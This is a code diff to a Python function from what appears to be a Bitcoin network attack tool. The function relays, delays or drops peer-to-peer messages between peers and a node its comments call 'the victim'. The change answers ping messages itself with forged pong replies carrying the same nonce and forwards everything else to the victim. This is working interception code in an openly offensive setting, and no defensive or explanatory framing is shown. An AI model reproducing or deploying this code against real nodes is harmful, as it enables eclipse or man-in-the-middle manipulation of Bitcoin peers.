@@ -376,9 +376,6 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, f
 	if not payload_valid: return
 	if not payload_length_valid: return
 
-	# Parse the message payload
-	#msg = MsgSerializable.from_bytes(packet)
-
 	# Relay Bitcoin packets that aren't from the victim
 	if msg_type in seconds_delay:
 		if seconds_delay[msg_type] == -1:
@@ -388,15 +385,20 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, f
 			print(f'*** *** Delaying message by {seconds_delay[msg_type]} seconds ** {from_ip} --> {to_ip} ** {msg_type}')
 			time.sleep(seconds_delay[msg_type])
 
+
+
 	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
 	if orig_socket == None: return False # If the original's socket isn't running, don't bother trying to relay
 	try:
-		#if msg_type == 'ping':
-		#	pong = msg_pong(bitcoin_protocolversion)
-		#	pong.nonce = msg.nonce
-		#	socket.send(pong.to_bytes())
+		if msg_type == 'ping':
+			# Parse the message payload
+			msg = MsgSerializable.from_bytes(packet)
 
-		orig_socket.send(packet) # Relay to the victim
+			pong = msg_pong(bitcoin_protocolversion)
+			pong.nonce = msg.nonce
+			socket.send(pong.to_bytes())
+		else:
+			orig_socket.send(packet) # Relay to the victim
 
 	except Exception as e:
 		print("Closing socket because of error: " + str(e))
